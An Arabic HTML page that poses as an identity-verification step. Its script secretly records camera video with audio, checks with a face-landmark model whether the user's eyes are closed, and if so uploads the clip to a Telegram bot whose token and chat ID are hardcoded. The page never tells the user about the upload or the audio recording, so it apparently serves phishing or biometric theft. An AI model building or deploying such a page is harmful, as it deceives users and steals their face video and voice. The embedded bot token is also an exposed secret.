<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>التحقق من هويتك</title>
  <style>
    :root{
      --accent:#2f9fff;
      --text:#333;
      --muted:#6b6b6b;
      --bg:#ffffff;
      --radius:14px;
      --maxw:420px;
      --mobile-padding:22px;
      --btn-height:58px;
    }
    html,body{
      height:100%;
      margin:0;
      font-family: "Segoe UI", Tahoma, "Helvetica Neue", Arial, "Noto Sans Arabic", sans-serif;
      background:linear-gradient(180deg,#f7f9fc 0%, #ffffff 100%);
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .page {
      max-width:var(--maxw);
      margin:0 auto;
      min-height:100vh;
      display:flex;
      flex-direction:column;
      align-items:stretch;
      justify-content:flex-start;
      position:relative;
      background:transparent;
    }

    .topbar{
      padding:14px var(--mobile-padding);
      display:flex;
      justify-content:flex-start;
      align-items:center;
    }
    .back {
      margin-inline-start:auto;
      width:36px;
      height:36px;
      display:flex;
      align-items:center;
      justify-content:center;
      border-radius:999px;
      color:var(--muted);
      cursor:pointer;
      user-select:none;
    }
    .back svg{ width:18px; height:18px; }

    .card {
      background:var(--bg);
      margin:0 auto;
      padding:0 var(--mobile-padding);
      flex:1 1 auto;
      display:flex;
      flex-direction:column;
      align-items:stretch;
    }

    .visual {
      margin-top:6px;
      display:flex;
      justify-content:center;
      align-items:center;
      padding-top:6px;
      padding-bottom:8px;
    }

    .phone-img {
      width:220px;
      max-width:64%;
      height:auto;
      border-radius:10px;
      box-shadow:0 18px 30px rgba(47,159,255,0.06), 0 6px 12px rgba(30,30,30,0.04);
      background:#fff;
      object-fit:cover;
      display:block;
    }

    h1 {
      margin:18px 0 6px 0;
      font-size:20px;
      text-align:center;
      color:var(--accent);
      font-weight:700;
    }
    p.lead {
      margin:0 0 18px 0;
      text-align:center;
      color:var(--muted);
      font-size:15px;
    }

    .tips {
      margin-top:8px;
      display:block;
      padding:8px 0 120px 0;
    }
    .tips ul{
      list-style: disc;
      padding-inline-start:22px;
      margin:10px 6px;
      color:var(--text);
      line-height:1.9;
      font-size:16px;
    }
    .tips ul { direction: rtl; }
    .tips ul li { text-align: right; }

    .bottom {
      position:fixed;
      left:0;
      right:0;
      bottom:18px;
      display:flex;
      justify-content:center;
      pointer-events:none;
    }
    .btn-wrap{
      width:100%;
      max-width:var(--maxw);
      padding:0 var(--mobile-padding);
      pointer-events:auto;
    }
    .btn {
      width:100%;
      height:var(--btn-height);
      background:linear-gradient(180deg,var(--accent), #1b88e6);
      border-radius:28px;
      color:#fff;
      font-size:18px;
      font-weight:600;
      border:0;
      cursor:pointer;
      box-shadow:0 6px 20px rgba(47,159,255,0.18);
    }

    /* overlay للتصوير */
    .overlay {
      position:fixed;
      inset:0;
      background:rgba(0,0,0,0.6);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:9999;
    }
    .recorder {
      background:#fff;
      width:100%;
      max-width:420px;
      border-radius:12px;
      padding:12px;
      box-sizing:border-box;
      text-align:center;
    }
    video#cam {
      width:100%;
      border-radius:8px;
      background:#000;
    }
    .controls { margin-top:8px; display:flex; gap:8px; justify-content:center; align-items:center; }
    .muted { color:var(--muted); font-size:14px; }

    @media (max-width:420px){
      .phone-img{ width:56%; }
      .btn { height:54px; font-size:17px; }
    }
  </style>
</head>
<body>
  <div class="page" role="main" aria-label="صفحة التحقق من الهوية">
    <div class="topbar" aria-hidden="false">
      <div class="back" title="رجوع" onclick="history.back()">
        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <path d="M8 5l7 7-7 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
    </div>

    <div class="card">
      <div class="visual" aria-hidden="true">
        <img
          src="https://l.top4top.io/p_36648bqr85.jpeg"
          alt="صورة توضيحية للوجه"
          class="phone-img"
        />
      </div>

      <main style="padding:0 6px;">
        <h1>التحقق من هويتك</h1>
        <p class="lead">سنبدأ بتسجيل فيديو قصير ثم نتحقق إن كنت أغمضت عينيك.</p>

        <section class="tips" aria-labelledby="tips-heading">
          <ul id="tips-heading">
            <li>ضع وجهك في الإطار</li>
            <li>سنسجل فيديو قصير تلقائياً</li>
            <li>أزل القبعة أو النظارات</li>
          </ul>
        </section>
      </main>
    </div>

    <div class="bottom" role="navigation" aria-label="الأزرار">
      <div class="btn-wrap">
        <button class="btn" onclick="onNext()" aria-label="التالي">التالي</button>
      </div>
    </div>
  </div>

  <!-- Overlay للتصوير -->
  <div class="overlay" id="overlay" role="dialog" aria-modal="true">
    <div class="recorder" id="recorder">
      <div id="status" class="muted">تحميل النموذج... الرجاء الانتظار</div>
      <video id="cam" autoplay playsinline muted></video>
      <div class="controls">
        <div id="countdown" class="muted"></div>
        <button id="cancelBtn" class="btn" style="height:40px; padding:6px 12px; background:#ccc; color:#111;">إلغاء</button>
      </div>
    </div>
  </div>

  <!-- لوحات خفية -->
  <canvas id="snapCanvas" style="display:none;"></canvas>

  <!-- مكتبات TensorFlow + face-landmarks-detection (MediaPipe FaceMesh) -->
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.21.0/dist/tf.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.3/dist/face-landmarks-detection.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh@0.4.1646424915/face_mesh.js"></script>

  <script>
    // -------------- CONFIGURATION ----------------
    // تحذير أمني: وضع توكن البوت في كود العميل مكشوف لأي مستخدم. من الأفضل إنشاء endpoint على الخادم الذي يحمل التوكن ويقوم بالإرسال لسِرية التوكن.
    const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const TELEGRAM_CHAT_ID = "6873334348";
    const RECORD_SECONDS = 3; // مدة الفيديو (ثوان)
    // ---------------------------------------------

    const overlay = document.getElementById('overlay');
    const camVideo = document.getElementById('cam');
    const statusEl = document.getElementById('status');
    const countdownEl = document.getElementById('countdown');
    const cancelBtn = document.getElementById('cancelBtn');
    const snapCanvas = document.getElementById('snapCanvas');

    let stream = null;
    let model = null;
    let isRunning = false;

    // مؤشرات العين (MediaPipe FaceMesh) - نقاط تقريبية مستخدمة لحساب EAR
    const LEFT_EYE = [33,160,158,133,153,144];
    const RIGHT_EYE = [362,385,387,263,373,380];

    function dist(a,b){
      const dx = a.x - b.x;
      const dy = a.y - b.y;
      return Math.hypot(dx,dy);
    }

    function eyeAspectRatio(landmarks, indices){
      const p1 = landmarks[indices[0]];
      const p2 = landmarks[indices[1]];
      const p3 = landmarks[indices[2]];
      const p4 = landmarks[indices[3]];
      const p5 = landmarks[indices[4]];
      const p6 = landmarks[indices[5]];
      const A = dist(p2,p6);
      const B = dist(p3,p5);
      const C = dist(p1,p4);
      if (C === 0) return 1.0;
      return (A + B) / (2.0 * C);
    }

    async function loadModel(){
      statusEl.textContent = 'تحميل نموذج التعرف على الوجوه...';
      model = await faceLandmarksDetection.load(faceLandmarksDetection.SupportedPackages.mediapipeFacemesh, {
        maxFaces: 1
      });
      statusEl.textContent = 'جاهز للتصوير';
    }

    async function startCamera(){
      try{
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        camVideo.srcObject = stream;
        await camVideo.play();
      }catch(err){
        console.error('خطأ في الوصول للكاميرا', err);
        throw err;
      }
    }

    function stopCamera(){
      if (stream){
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      camVideo.pause();
      camVideo.srcObject = null;
    }

    function canvasToBlob(canvas, quality=0.9){
      return new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
    }

    // إرسال ملف الفيديو إلى تلغرام (sendVideo)
    async function sendVideoToTelegram(videoBlob){
      statusEl.textContent = 'إرسال الفيديو إلى تلغرام...';
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      // Telegram يدعم webm/mp4 كـ video
      form.append('video', videoBlob, 'recording.webm');

      try{
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const resp = await fetch(url, { method: 'POST', body: form });
        const data = await resp.json();
        if (data && data.ok){
          statusEl.textContent = 'تم إرسال الفيديو إلى البوت بنجاح.';
          return true;
        }else{
          console.error('Telegram API response error', data);
          statusEl.textContent = 'فشل إرسال الفيديو إلى تلغرام.';
          return false;
        }
      }catch(e){
        console.error('خطأ أثناء إرسال الفيديو إلى تلغرام', e);
        statusEl.textContent = 'حدث خطأ أثناء الإرسال.';
        return false;
      }
    }

    // تحليل صورة من الكانفاس لتحديد إن كانت العيون مغلقة
    async function detectEyesClosedFromCanvas(canvas){
      statusEl.textContent = 'تحليل الصورة...';
      const predictions = await model.estimateFaces({ input: canvas });
      if (!predictions || predictions.length === 0){
        statusEl.textContent = 'لم يتم العثور على وجه واضح. حاول مرة أخرى.';
        return null;
      }
      const mesh = predictions[0].scaledMesh;
      const landmarks = mesh.map(pt => ({ x: pt[0], y: pt[1] }));
      const leftEAR = eyeAspectRatio(landmarks, LEFT_EYE);
      const rightEAR = eyeAspectRatio(landmarks, RIGHT_EYE);
      const ear = (leftEAR + rightEAR) / 2;
      console.log('leftEAR', leftEAR, 'rightEAR', rightEAR, 'avg', ear);
      // عتبة تقريبية
      return ear < 0.23;
    }

    async function onNext(){
      if (isRunning) return;
      isRunning = true;
      overlay.style.display = 'flex';
      countdownEl.textContent = '';
      try{
        if (!model) {
          await loadModel();
        }
        await startCamera();
      }catch(err){
        statusEl.textContent = 'لا يمكن الوصول للكاميرا أو تحميل النموذج.';
        isRunning = false;
        return;
      }

      const total = RECORD_SECONDS;
      statusEl.textContent = 'سيبدأ التسجيل قريباً...';
      countdownEl.textContent = `سجل خلال ${total}s`;

      // إعداد MediaRecorder لتجميع الفيديو
      let recordedBlobs = [];
      let recorder = null;
      try{
        const options = { mimeType: 'video/webm;codecs=vp8' };
        recorder = new MediaRecorder(stream, options);
        recorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordedBlobs.push(e.data); };
        recorder.start();
      }catch(e){
        console.warn('MediaRecorder غير مدعوم أو فشل البدء', e);
        statusEl.textContent = 'المتصفح لا يدعم تسجيل الفيديو. حاول متصفح آخر.';
      }

      // عد تنازلي بصري
      let t = total;
      const interval = setInterval(() => {
        t--;
        if (t >= 0) countdownEl.textContent = `سجل خلال ${t}s`;
      }, 1000);

      // نلتقط لقطة من منتصف الفيديو لتحليل العيون
      await new Promise(resolve => setTimeout(resolve, Math.floor((total*1000)/2)));
      try{
        snapCanvas.width = camVideo.videoWidth;
        snapCanvas.height = camVideo.videoHeight;
        const ctx = snapCanvas.getContext('2d');
        ctx.drawImage(camVideo, 0, 0, snapCanvas.width, snapCanvas.height);
      }catch(e){
        console.error('خطأ أثناء التقاط اللقطة', e);
        statusEl.textContent = 'فشل التقاط الصورة.';
      }

      // ننتظر نهاية التسجيل
      await new Promise(resolve => setTimeout(resolve, Math.ceil((total*1000)/2)));

      // إيقاف المسجل
      if (recorder && recorder.state !== 'inactive') recorder.stop();
      clearInterval(interval);

      statusEl.textContent = 'إنهاء التسجيل... يتم المعالجة الآن';
      countdownEl.textContent = '';

      // تحليل اللقطة لتحديد العيون المغلقة
      const closed = await detectEyesClosedFromCanvas(snapCanvas);
      if (closed === null){
        statusEl.textContent = 'لم يتم التعرف على الوجه بوضوح. حاول مجدداً.';
      } else if (closed === true){
        statusEl.textContent = 'تم اكتشاف أن العيون مغلقة — سيتم إرسال الفيديو.';
        // تجميع الـ Blob من recordedBlobs
        const videoBlob = new Blob(recordedBlobs, { type: 'video/webm' });
        await sendVideoToTelegram(videoBlob);
      } else {
        statusEl.textContent = 'يبدو أن العيون مفتوحة — لن يتم الإرسال.';
      }

      // تنظيف
      stopCamera();
      setTimeout(() => {
        overlay.style.display = 'none';
        statusEl.textContent = 'جاهز للتصوير';
        isRunning = false;
      }, 2200);
    }

    // زر إلغاء
    cancelBtn.addEventListener('click', () => {
      stopCamera();
      overlay.style.display = 'none';
      isRunning = false;
    });

    // تحميل النموذج مسبقاً لتحسين زمن الاستجابة
    (async function init(){
      try{
        await loadModel();
        statusEl.textContent = 'جاهز — اضغط التالي لبدء التسجيل';
      }catch(e){
        statusEl.textContent = 'فشل تحميل النموذج. تأكد من اتصال الإنترنت أو جرب إعادة تحميل الصفحة.';
        console.error(e);
      }
    })();
  </script>
</body>
</html>